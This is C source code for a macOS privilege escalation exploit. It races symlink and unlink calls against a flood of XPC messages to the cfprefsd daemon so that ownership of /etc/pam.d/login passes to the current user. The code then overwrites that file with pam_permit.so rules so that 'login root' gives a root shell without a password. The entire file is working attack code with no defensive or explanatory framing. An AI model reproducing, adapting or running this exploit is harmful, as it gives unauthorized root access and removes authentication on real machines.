#include <sandbox.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <pwd.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <xpc/xpc.h>
#include <pthread.h>

// chown(TARGET, USER, group(USER))
#define TARGET "/etc/pam.d/login"
char *WRITABLE;
char *USER;

const int COUNT = 10000;
int status = 0;
bool pwned = false;

void *race(void *arg) {
	while(!pwned) {
		symlink(TARGET, "!");
		unlink("!/a.plist");
		rmdir("!");
		unlink("!");
	}
	return NULL;
}

void exploit() {
	char *serviceName = "com.apple.cfprefsd.daemon";
	status = 0;

	xpc_connection_t conn;
	xpc_object_t msg;

	conn = xpc_connection_create_mach_service(serviceName, NULL, 0);
	if (conn == NULL) {
		perror("xpc_connection_create_mach_service");
		return;
	}

	xpc_connection_set_event_handler(conn, ^(xpc_object_t obj) {
		status++;
	});

	xpc_connection_resume(conn);

	msg = xpc_dictionary_create(NULL, NULL, 0);
	xpc_dictionary_set_int64(msg, "CFPreferencesOperation", 1);
	xpc_dictionary_set_string(msg, "CFPreferencesUser", USER);
	char writable_subpath[0x1000];
	sprintf(writable_subpath, "%s%s", WRITABLE, "/!/a.plist");
	xpc_dictionary_set_string(msg, "CFPreferencesDomain", writable_subpath);
	xpc_dictionary_set_bool(msg, "CFPreferencesUseCorrectOwner", true);
	xpc_dictionary_set_bool(msg, "CFPreferencesAvoidCache", true);
	xpc_dictionary_set_string(msg, "Key", "key");
	xpc_dictionary_set_string(msg, "Value", "value");

	for(int i = 0; i < COUNT; i++) {
		xpc_connection_send_message(conn, msg);
	}

	while(status < COUNT) {
		usleep(100000);
	}
}

void *pwn(void *arg) {
#define QUOTE(x) #x

	char literal[] = QUOTE(
auth       optional       pam_permit.so
auth       optional       pam_permit.so
auth       optional       pam_permit.so
auth       required       pam_permit.so
account    required       pam_permit.so
account    required       pam_permit.so
password   required       pam_permit.so
session    required       pam_permit.so
session    required       pam_permit.so
session    optional       pam_permit.so
);

	while(1) {
		int fd = open("/etc/pam.d/login", O_CREAT|O_WRONLY, 0777);
		if(fd != -1) {
			write(fd, literal, strlen(literal));
			close(fd);
			puts("pwned! now 'login root' will give you a root shell");
			pwned = true;
			break;
		} else {
			perror("open");
		}
		usleep(1000000);
	}

	return NULL;
}

static void
connection_handler(xpc_connection_t peer)
{
	xpc_connection_set_event_handler(peer, ^(xpc_object_t event) {
		printf("Message received: %p\n", event);
	});

	xpc_connection_resume(peer);
}

void getroot() {
	struct passwd *pw = getpwuid(getuid());
	if(!pw) {
		perror("getpwuid");
		exit(1);
	}

	WRITABLE = pw->pw_dir;
	USER = pw->pw_name;

	setvbuf(stdout, 0, 2, 0);
	chdir(WRITABLE);

	pthread_t thread[2];
	pthread_create(&thread[0], NULL, race, NULL);
	pthread_create(&thread[1], NULL, pwn, NULL);
	while(!pwned) {
		printf("Trying %d calls...\n", COUNT);
		exploit();
	}
}
